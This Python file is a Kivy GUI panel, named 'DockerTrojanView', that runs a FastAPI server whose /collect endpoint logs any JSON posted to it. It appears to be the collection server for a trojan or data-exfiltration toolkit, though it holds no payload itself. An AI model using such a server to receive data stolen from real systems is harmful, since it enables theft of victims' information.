import threading
import asyncio
import os
from kivy.app import App
from kivy.uix.gridlayout import GridLayout
from kivy.uix.button import Button
from kivy.clock import Clock
from fastapi import FastAPI, Request
import json
from datetime import datetime
from uvicorn import Config, Server
from gui.utils.console_view import ConsoleView

app = FastAPI()

class UvicornServer:
    def __init__(self, console_view: ConsoleView):
        self.config = Config(app=app, host="0.0.0.0", port=5001, workers=1)
        self.server = None
        self.loop = None
        self.thread = None
        self.console_view = console_view

    def start(self):
        if not self.thread or not self.thread.is_alive():
            self.thread = threading.Thread(target=self._start_loop, daemon=True)
            self.thread.start()

    def _start_loop(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        self.server = Server(config=self.config)
        self.loop.run_until_complete(self.server.serve())

    def stop(self):
        if self.loop and self.server and not self.server.should_exit:
            self.loop.call_soon_threadsafe(self.server.handle_exit, None, None)

class DockerTrojanView(GridLayout):
    def __init__(self, console_view: ConsoleView, **kwargs):
        super(DockerTrojanView, self).__init__(**kwargs)
        self.cols = 1
        self.console_view = console_view

        self.clear_log_file()

        self.start_button = Button(text="Start Server", size_hint=(1, None), height=50)
        self.start_button.bind(on_press=self.start_server)
        self.add_widget(self.start_button)

        self.stop_button = Button(text="Stop Server", size_hint=(1, None), height=50)
        self.stop_button.bind(on_press=self.stop_server)
        self.stop_button.disabled = True
        self.add_widget(self.stop_button)

        self.log_button = Button(text="Open Log File", size_hint=(1, None), height=50)
        self.log_button.bind(on_press=self.open_log_file)
        self.add_widget(self.log_button)

        global uvicorn_server
        uvicorn_server = UvicornServer(console_view)

    def clear_log_file(self):
        log_file_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../Resources/collected_data.log'))
        with open(log_file_path, "w") as file:
            file.write("")

    def start_server(self, instance):
        self.console_view.add_text_schedule("Starting server.")
        uvicorn_server.start()
        Clock.schedule_once(lambda dt: self.update_ui_after_start())

    def update_ui_after_start(self):
        self.console_view.add_text("Server started on port 5001.")
        self.start_button.disabled = True
        self.stop_button.disabled = False

    def stop_server(self, instance):
        self.console_view.add_text_schedule("Stopping server.")
        uvicorn_server.stop()
        Clock.schedule_once(lambda dt: self.update_ui_after_stop())

    def update_ui_after_stop(self):
        self.console_view.add_text("Server stopped.")
        self.start_button.disabled = False
        self.stop_button.disabled = True

    def open_log_file(self, instance):
        log_file_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../Resources/collected_data.log'))
        if os.path.exists(log_file_path):
            os.startfile(log_file_path)
        else:
            self.console_view.add_text_schedule("Log file does not exist.")

@app.post("/collect")
async def collect_data(request: Request):
    try:
        data = await request.json()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_file_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../Resources/collected_data.log'))
        with open(log_file_path, "a") as file:
            file.write(f"{timestamp} :\n {json.dumps(data, indent=4)}\n")
        uvicorn_server.console_view.add_text_schedule(f"Data received: {json.dumps(data, indent=4)}")
        return {"status": "success", "message": "Data received and logged."}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/")
async def read_root():
    return {"message": "FastAPI collecting server is running."}